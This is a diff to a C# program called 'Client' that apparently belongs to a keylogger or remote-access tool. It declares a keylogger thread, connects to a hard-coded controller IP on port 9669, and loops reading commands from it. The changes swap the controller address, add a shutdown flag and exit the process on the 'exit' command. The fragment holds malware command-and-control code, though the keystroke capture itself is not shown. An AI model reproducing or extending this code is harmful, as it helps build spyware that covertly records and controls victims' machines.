@@ -30,6 +30,7 @@ namespace Client
         private const int PORT_NUMBER = 9669;
         static Thread th_doKeylogger;
         static Thread th_socket;
+        private static Boolean isRunning = true;
         public static WebClient webClient = new WebClient();
 
         static ASCIIEncoding encoding = new ASCIIEncoding();
@@ -447,15 +448,11 @@ namespace Client
             }
             else if (command.StartsWith("exit"))
             {
-
-                string str = "done";
-
-                data = encoding.GetBytes(str);
-                stream.Write(data, 0, data.Length);
-                Console.WriteLine("xong exit");
                 client.Close();
+                isRunning= false;
             }
         }
+
         public static void handleConnectSocket()
         {
 
@@ -474,11 +471,11 @@ namespace Client
                 // Bind the client to the local endpoint
                 client.Client.Bind(localEndPoint);
 
-                client.Connect("192.168.1.100", PORT_NUMBER);
+                client.Connect("172.20.10.4", PORT_NUMBER);
                 Stream stream = client.GetStream();
                 //Console.WriteLine("connect xong socket");
                 byte[] data;
-                while (true)
+                while (isRunning == true)
                 {
                     data = new byte[BUFFER_SIZE];
                     stream.Read(data, 0, BUFFER_SIZE);
@@ -492,6 +489,7 @@ namespace Client
                 Console.WriteLine("Error: " + ex);
             }
             driver.Quit();
+            Environment.Exit(0);
         }
         public static void Main(string[] args)
         {
